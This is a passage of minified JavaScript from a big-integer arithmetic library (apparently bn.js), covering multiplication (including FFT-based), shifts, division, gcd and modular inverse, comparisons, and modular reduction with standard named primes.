                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function jumboMulTo(self, num, out) {
                    return new FFTM().mulp(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length
                            ? comb10MulTo(this, num, out)
                            : len < 63
                            ? smallMulTo(this, num, out)
                            : len < 1024
                            ? (function (self, num, out) {
                                  (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                                  for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                                      var ncarry = hncarry;
                                      hncarry = 0;
                                      for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                                          var i = k - j,
                                              r = (0 | self.words[i]) * (0 | num.words[j]),
                                              lo = 67108863 & r;
                                          (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                                      }
                                      (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                                  }
                                  return 0 !== carry ? (out.words[k] = carry) : out.length--, out.strip();
                              })(this, num, out)
                            : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out.strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] & (1 << wbit)) >>> wbit;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this.strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) < num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this.strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this.strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this.strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q.strip(), a.strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modn = function (num) {
                        assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return acc;
                    }),
                    (BN.prototype.idivn = function (num) {
                        assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this.strip();
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this.strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
                        return assert(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this);
                    }),
                    (BN.prototype.redISqr = function () {
                        return assert(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this);
                    }),
                    (BN.prototype.redSqrt = function () {
                        return assert(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this);
                    }),
                    (BN.prototype.redInvm = function () {
                        return assert(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this);
                    }),
                    (BN.prototype.redNeg = function () {
                        return assert(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this);
                    }),
                    (BN.prototype.redPow = function (num) {
                        return assert(this.red && !num.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, num);
                    });
                var primes = { k256: null, p224: null, p192: null, p25519: null };
                function MPrime(name, p) {
                    (this.name = name), (this.p = new BN(p, 16)), (this.n = this.p.bitLength()), (this.k = new BN(1).iushln(this.n).isub(this.p)), (this.tmp = this._tmp());
                }
                function K256() {
                    MPrime.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f");
                }
                function P224() {
                    MPrime.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001");
                }
                function P192() {
                    MPrime.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff");
                }
                function P25519() {
                    MPrime.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed");
                }
                function Red(m) {
                    if ("string" == typeof m) {
                        var prime = BN._prime(m);
                        (this.m = prime.p), (this.prime = prime);
                    } else assert(m.gtn(1), "modulus must be greater than 1"), (this.m = m), (this.prime = null);
                }
                function Mont(m) {
                    Red.call(this, m),
                        (this.shift = this.m.bitLength()),
                        this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
                        (this.r = new BN(1).iushln(this.shift)),
                        (this.r2 = this.imod(this.r.sqr())),
                        (this.rinv = this.r._invmp(this.m)),
                        (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
                        (this.minv = this.minv.umod(this.r)),
                        (this.minv = this.r.sub(this.minv));
                }
                (MPrime.prototype._tmp = function () {
                    var tmp = new BN(null);
                    return (tmp.words = new Array(Math.ceil(this.n / 13))), tmp;
                }),
                    (MPrime.prototype.ireduce = function (num) {
                        var rlen,
                            r = num;
                        do {
                            this.split(r, this.tmp), (rlen = (r = (r = this.imulK(r)).iadd(this.tmp)).bitLength());
                        } while (rlen > this.n);
                        var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
                        return 0 === cmp ? ((r.words[0] = 0), (r.length = 1)) : cmp > 0 ? r.isub(this.p) : void 0 !== r.strip ? r.strip() : r._strip(), r;
                    }),
                    (MPrime.prototype.split = function (input, out) {
                        input.iushrn(this.n, 0, out);
                    }),
                    (MPrime.prototype.imulK = function (num) {
                        return num.imul(this.k);
                    }),
                    inherits(K256, MPrime),
                    (K256.prototype.split = function (input, output) {
                        for (var outLen = Math.min(input.length, 9), i = 0; i < outLen; i++) output.words[i] = input.words[i];
                        if (((output.length = outLen), input.length <= 9)) return (input.words[0] = 0), void (input.length = 1);
                        var prev = input.words[9];
                        for (output.words[output.length++] = 4194303 & prev, i = 10; i < input.length; i++) {
                            var next = 0 | input.words[i];
                            (input.words[i - 10] = ((4194303 & next) << 4) | (prev >>> 22)), (prev = next);
                        }
                        (prev >>>= 22), (input.words[i - 10] = prev), 0 === prev && input.length > 10 ? (input.length -= 10) : (input.length -= 9);
                    }),
                    (K256.prototype.imulK = function (num) {
                        (num.words[num.length] = 0), (num.words[num.length + 1] = 0), (num.length += 2);
                        for (var lo = 0, i = 0; i < num.length; i++) {
                            var w = 0 | num.words[i];
                            (lo += 977 * w), (num.words[i] = 67108863 & lo), (lo = 64 * w + ((lo / 67108864) | 0));
                        }
                        return 0 === num.words[num.length - 1] && (num.length--, 0 === num.words[num.length - 1] && num.length--), num;
                    }),
                    inherits(P224, MPrime),
                    inherits(P192, MPrime),
                    inherits(P25519, MPrime),
                    (P25519.prototype.imulK = function (num) {
                        for (var carry = 0, i = 0; i < num.length; i++) {
                            var hi = 19 * (0 | num.words[i]) + carry,
                                lo = 67108863 & hi;
                            (hi >>>= 26), (num.words[i] = lo), (carry = hi);
                        }
                        return 0 !== carry && (num.words[num.length++] = carry), num;
                    }),
                    (BN._prime = function (name) {
                        if (primes[name]) return primes[name];
                        var prime;
                        if ("k256" === name) prime = new K256();
                        else if ("p224" === name) prime = new P224();
                        else if ("p192" === name) prime = new P192();
                        else {
                            if ("p25519" !== name) throw new Error("Unknown prime " + name);
                            prime = new P25519();
                        }
                        return (primes[name] = prime), prime;
                    }),
                    (Red.prototype._verify1 = function (a) {
                        assert(0 === a.negative, "red works only with positives"), assert(a.red, "red works only with red numbers");
                    }),
                    (Red.prototype._verify2 = function (a, b) {
                        assert(0 == (a.negative | b.negative), "red works only with positives"), assert(a.red && a.red === b.red, "red works only with red numbers");
                    }),
                    (Red.prototype.imod = function (a) {
                        return this.prime ? this.prime.ireduce(a)._forceRed(this) : a.umod(this.m)._forceRed(this);
                    }),
